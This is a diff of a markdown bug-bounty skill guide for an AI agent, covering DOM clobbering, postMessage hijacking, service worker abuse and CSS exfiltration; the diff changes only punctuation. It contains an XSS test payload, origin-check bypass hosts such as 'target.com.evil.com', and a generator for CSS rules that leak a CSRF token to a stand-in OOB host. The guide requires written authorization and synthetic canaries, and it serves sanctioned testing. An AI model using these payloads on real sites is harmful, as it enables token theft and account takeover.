@@ -29,24 +29,24 @@ report_count: 14
 >
 > Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
 
-# HUNT-DOM: DOM Clobbering / PostMessage / Service Worker / CSS Exfil
+# HUNT-DOM — DOM Clobbering / PostMessage / Service Worker / CSS Exfil
 
 ## Crown Jewel Targets
 
-DOM-based attacks execute in the victim's browser; some sources never reach the server, while others do; assess the actual data path rather than assuming WAF/input filters are irrelevant. PostMessage missing-origin-check = cross-origin token theft with no XSS needed.
+DOM-based attacks execute in the victim's browser — some sources never reach the server, while others do; assess the actual data path rather than assuming WAF/input filters are irrelevant. PostMessage missing-origin-check = cross-origin token theft with no XSS needed.
 
 **Highest-value chains:**
-- **DOM Clobbering → DOM-XSS / auth bypass**; HTML *markup* injection (no `<script>`) overwrites a JS global like `window.config` or a form named property, and the app later treats that value as a URL/code → sink fires under a markup-only injection where script is filtered.
-- **PostMessage no origin check → session theft / DOM-XSS**; a `message` handler that trusts `event.data` without validating `event.origin` lets an attacker iframe/opener drive privileged actions or feed a sink.
-- **Service Worker abuse**; register a **same-origin** SW script (reachable because of an authorized same-origin JavaScript upload/path) via stored XSS → intercept all in-scope `fetch` → persistent credential capture.
-- **CSS Exfil**; attribute-value selectors (`input[value^="a"]`) leak a CSRF token / API key / nonce char-by-char to an OOB host with zero JS.
+- **DOM Clobbering → DOM-XSS / auth bypass** — HTML *markup* injection (no `<script>`) overwrites a JS global like `window.config` or a form named property, and the app later treats that value as a URL/code → sink fires under a markup-only injection where script is filtered.
+- **PostMessage no origin check → session theft / DOM-XSS** — a `message` handler that trusts `event.data` without validating `event.origin` lets an attacker iframe/opener drive privileged actions or feed a sink.
+- **Service Worker abuse** — register a **same-origin** SW script (reachable because of an authorized same-origin JavaScript upload/path) via stored XSS → intercept all in-scope `fetch` → persistent credential capture.
+- **CSS Exfil** — attribute-value selectors (`input[value^="a"]`) leak a CSRF token / API key / nonce char-by-char to an OOB host with zero JS.
 
-### Grounding: public research this is distilled from
-- **DOM Clobbering / DOM-Invader**; Gareth Heyes & the PortSwigger Web Security Academy "DOM clobbering" topic; DOM-Invader ships a dedicated clobbering scanner. Sink taxonomy maps to the academy's DOM-based vulnerability labs.
-- **DOMPurify clobbering & mXSS bypasses**; Michał Bentkowski (Securitum) blog series on bypassing HTML sanitizers via clobbering and mutation XSS.
-- **jQuery `htmlPrefilter` self-closing-tag XSS**; **CVE-2020-11022** and **CVE-2020-11023** (jQuery < 3.5.0). Passing attacker HTML to `.html()` / `.append()` mutates into executing markup. Grep bundled jQuery version; this is one of the most common real-world DOM-XSS roots.
-- **CSS exfiltration**; d0nut "CSS Injection Attacks" / "Stealing Data With CSS" research (sequential `@import` recursion to drop the per-char-position constraint).
-> Cite only what you reproduce. Do not paste these as "proof" in a report; your PoC against the live target is the evidence. Named research here is for *technique provenance*, not severity inflation.
+### Grounding — public research this is distilled from
+- **DOM Clobbering / DOM-Invader** — Gareth Heyes & the PortSwigger Web Security Academy "DOM clobbering" topic; DOM-Invader ships a dedicated clobbering scanner. Sink taxonomy maps to the academy's DOM-based vulnerability labs.
+- **DOMPurify clobbering & mXSS bypasses** — Michał Bentkowski (Securitum) blog series on bypassing HTML sanitizers via clobbering and mutation XSS.
+- **jQuery `htmlPrefilter` self-closing-tag XSS** — **CVE-2020-11022** and **CVE-2020-11023** (jQuery < 3.5.0). Passing attacker HTML to `.html()` / `.append()` mutates into executing markup. Grep bundled jQuery version; this is one of the most common real-world DOM-XSS roots.
+- **CSS exfiltration** — d0nut "CSS Injection Attacks" / "Stealing Data With CSS" research (sequential `@import` recursion to drop the per-char-position constraint).
+> Cite only what you reproduce. Do not paste these as "proof" in a report — your PoC against the live target is the evidence. Named research here is for *technique provenance*, not severity inflation.
 
 ---
 
@@ -68,7 +68,7 @@ user bio / display name / comment / markdown preview / SVG upload / CMS rich-tex
 
 ---
 
-## Phase 1: DOM Clobbering
+## Phase 1 — DOM Clobbering
 
 ```bash
 # Signal: app reads element IDs/names as if they were JS objects, OR feeds a
@@ -106,14 +106,14 @@ susp.forEach(k => {
 curl -s "https://$TARGET/" | grep -nE \
   "document\.(getElementById|baseURI)|window\.[A-Za-z_]+\.(url|src|href|html|cmd)|\
 location\s*=\s*[A-Za-z_]|\.innerHTML\s*=|eval\(|new Function\(|\.src\s*=\s*[A-Za-z_]"
-# DOM-Invader (Burp) → enable "DOM clobbering": it auto-finds clobberable sources→sinks.
+# DOM-Invader (Burp) → enable "DOM clobbering" — it auto-finds clobberable sources→sinks.
 ```
 
 **jQuery angle:** if the bundle ships jQuery < 3.5.0, attacker HTML passed to `.html()`/`.append()` self-mutates to execute (**CVE-2020-11022 / CVE-2020-11023**). Confirm version then test `<style><style /><img src=x onerror=alert(document.domain)>`.
 
 ---
 
-## Phase 2: PostMessage Hijacking
+## Phase 2 — PostMessage Hijacking
 
 Two bug classes: (a) **listener** trusts cross-origin data → drive a sink/privileged action; (b) **sender** broadcasts secrets with target origin `'*'` → any framing page reads them.
 
@@ -147,7 +147,7 @@ then use a harmless marker matched to its schema. Prove impact with controlled
 accounts; never send cookies, complete DOM, bearer tokens or messages to a third
 party OOB service merely to demonstrate receipt.
 
-> False-positive guard: a handler with a *partial* check (`origin.indexOf('target.com')>-1`, `endsWith('target.com')`, regex `target\.com`) is still vulnerable; bypass with `target.com.evil.com` or `eviltarget.com`. Confirm by serving the PoC from such a look-alike host and showing the message still lands.
+> False-positive guard: a handler with a *partial* check (`origin.indexOf('target.com')>-1`, `endsWith('target.com')`, regex `target\.com`) is still vulnerable — bypass with `target.com.evil.com` or `eviltarget.com`. Confirm by serving the PoC from such a look-alike host and showing the message still lands.
 
 ---
 
@@ -160,9 +160,9 @@ Test first-message trust only with a bounded synthetic canary and explicit scope
 not a tight message flood. Validate exact origin, expected `event.source` and a
 bounded message schema together. [HTML messaging standard](https://html.spec.whatwg.org/multipage/web-messaging.html).
 
-## Phase 3: Service Worker Abuse
+## Phase 3 — Service Worker Abuse
 
-**Hard rule (corrects a common mistake):** a SW script URL **must be same-origin** as the page calling `register()`. A cross-origin script URL (`https://evil.com/sw.js`) throws `SecurityError`; there is **no header that enables cross-origin SW *script* registration**. `Service-Worker-Allowed` only widens the **scope** a same-origin script may control, not where the script may live.
+**Hard rule (corrects a common mistake):** a SW script URL **must be same-origin** as the page calling `register()`. A cross-origin script URL (`https://evil.com/sw.js`) throws `SecurityError` — there is **no header that enables cross-origin SW *script* registration**. `Service-Worker-Allowed` only widens the **scope** a same-origin script may control, not where the script may live.
 
 So the realistic path is: get a SW script **onto the target origin** (approved file upload that directly serves JavaScript without redirects, a JSON/JSONP endpoint with `text/javascript`, or an existing route under your control), then register it from same-origin XSS.
 
@@ -188,7 +188,7 @@ to cross-origin registration. MIME, secure context, scope, CSP, activation and
 browser storage state matter. A `SecurityError` has multiple possible causes,
 not just wrong origin. See [Service Workers specification](https://www.w3.org/TR/service-workers/).
 
-## Phase 4: CSS Injection / Exfiltration
+## Phase 4 — CSS Injection / Exfiltration
 
 ```bash
 # Prereq: attacker controls CSS (custom-theme field, style= passthrough, email
@@ -197,7 +197,7 @@ not just wrong origin. See [Service Workers specification](https://www.w3.org/TR
 # Step 2 leak attribute values char-by-char via attribute selectors + url() to OOB.
 ```
 
-> **Scope caveat (corrects an overstatement):** CSS exfil bypasses CSP that blocks *script execution*; it does **not** bypass a CSP whose `style-src` / `img-src` / `default-src` / `connect-src` restricts external origins, or `form-action`. If `img-src 'self'` is set, `url(https://OOB/...)` is **blocked**. Always read the live `Content-Security-Policy` header first; if external resource origins are locked down, CSS exfil is dead and you should say so rather than claim it.
+> **Scope caveat (corrects an overstatement):** CSS exfil bypasses CSP that blocks *script execution* — it does **not** bypass a CSP whose `style-src` / `img-src` / `default-src` / `connect-src` restricts external origins, or `form-action`. If `img-src 'self'` is set, `url(https://OOB/...)` is **blocked**. Always read the live `Content-Security-Policy` header first; if external resource origins are locked down, CSS exfil is dead and you should say so rather than claim it.
 
 ```css
 /* One request fires only for the matching first char. */
@@ -216,7 +216,7 @@ attr, oob, pos = 'name="csrf"', 'https://OOB.example/c', 0
 print("\n".join(
   f'input[{attr}][value^="{c}"]{{background:url({oob}?p={pos}&c={c})}}' for c in chars))
 # Real exfil needs recursion: serve a stylesheet whose @import pulls the next
-# position's rules only after the current prefix matched (d0nut technique) -
+# position's rules only after the current prefix matched (d0nut technique) —
 # this removes the "static input, one char" limitation.
 ```
 
@@ -224,7 +224,7 @@ print("\n".join(
 
 ---
 
-## Phase 5: dangerouslySetInnerHTML / framework sinks
+## Phase 5 — dangerouslySetInnerHTML / framework sinks
 
 ```bash
 grep -rnE "dangerouslySetInnerHTML|v-html=|\[innerHTML\]=|\.html\(" recon/$TARGET/ --include="*.js" 2>/dev/null
@@ -236,7 +236,7 @@ curl -s "https://$TARGET/_next/static/chunks/pages/index.js" | grep -oP 'dangero
 
 ---
 
-## Phase 6: Client-Side Template Injection
+## Phase 6 — Client-Side Template Injection
 
 ```bash
 # Detect framework, then test the {{}} sink in a sandbox-bypass form.
@@ -266,9 +266,9 @@ grep -rnE "angular|vue|handlebars|mustache|nunjucks|alpinejs|\bv-|ng-app" recon/
 ## Tools
 
 ```bash
-# DOM Invader (built into Burp browser): sources→sinks, postMessage logger, clobbering scanner
-# postMessage-tracker: Chrome extension logging cross-window messages
-# Burp Collaborator / interactsh / request-bin: only an approved synthetic-canary OOB sink for CSS-exfil & SW PoCs
+# DOM Invader (built into Burp browser) — sources→sinks, postMessage logger, clobbering scanner
+# postMessage-tracker — Chrome extension logging cross-window messages
+# Burp Collaborator / interactsh / request-bin — only an approved synthetic-canary OOB sink for CSS-exfil & SW PoCs
 # Verify any tool URL before citing it in a report; do not paste unverified repo links.
 ```
 
@@ -278,11 +278,11 @@ grep -rnE "angular|vue|handlebars|mustache|nunjucks|alpinejs|\bv-|ng-app" recon/
 
 Match the repo standard: a technique that *fires in DevTools* needs reproducible evidence of an attacker-controlled source reaching a meaningful sink; OOB and state changes are not mandatory for every class.
 
-- **DOM Clobbering**; show the clobbered value actually reaching a sink (XSS payload executes, or app navigates/loads from attacker URL). A clobberable global that never reaches a sink = no impact, do not report.
-- **PostMessage**; distinguish a *missing* check from a *weak* one; bypass weak checks from a look-alike origin and capture via OOB. A noisy `message` log alone is not proof; show the privileged action or token exfil.
-- **CSS exfil**; Use reproducible synthetic-canary evidence; an OOB callback is one possible proof. Read CSP first: `img-src`/`style-src`/`connect-src`/`default-src` restricting external origins kills it. A blocked `url()` is indistinguishable from success in the Network tab; confirm on the Collaborator side.
-- **Service Worker**; registration must be **same-origin script**; a `SecurityError` means you cited the wrong origin. Prove *persistence* (close tabs → reopen → fresh OOB hit, no XSS re-fire).
-- **General**; unique per-test markers (`btoa(domain)+nonce`) so an OOB hit is attributable to YOUR payload and not background traffic; body-diff the rendered DOM, not the raw HTML, since these are client-side.
+- **DOM Clobbering** — show the clobbered value actually reaching a sink (XSS payload executes, or app navigates/loads from attacker URL). A clobberable global that never reaches a sink = no impact, do not report.
+- **PostMessage** — distinguish a *missing* check from a *weak* one; bypass weak checks from a look-alike origin and capture via OOB. A noisy `message` log alone is not proof — show the privileged action or token exfil.
+- **CSS exfil** — Use reproducible synthetic-canary evidence; an OOB callback is one possible proof. Read CSP first: `img-src`/`style-src`/`connect-src`/`default-src` restricting external origins kills it. A blocked `url()` is indistinguishable from success in the Network tab — confirm on the Collaborator side.
+- **Service Worker** — registration must be **same-origin script**; a `SecurityError` means you cited the wrong origin. Prove *persistence* (close tabs → reopen → fresh OOB hit, no XSS re-fire).
+- **General** — unique per-test markers (`btoa(domain)+nonce`) so an OOB hit is attributable to YOUR payload and not background traffic; body-diff the rendered DOM, not the raw HTML, since these are client-side.
 
 **Potential severity (requires actual reach, privileges, scope and program rubric):**
 - Same-origin Service Worker → persistent credential intercept: **Critical**
@@ -293,7 +293,7 @@ Match the repo standard: a technique that *fires in DevTools* needs reproducible
 ## When to Use
 
 - You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
-- You need the recon, exploitation, or validation workflow described below; executed strictly inside the approved scope.
+- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.
 
 ## Limitations
 
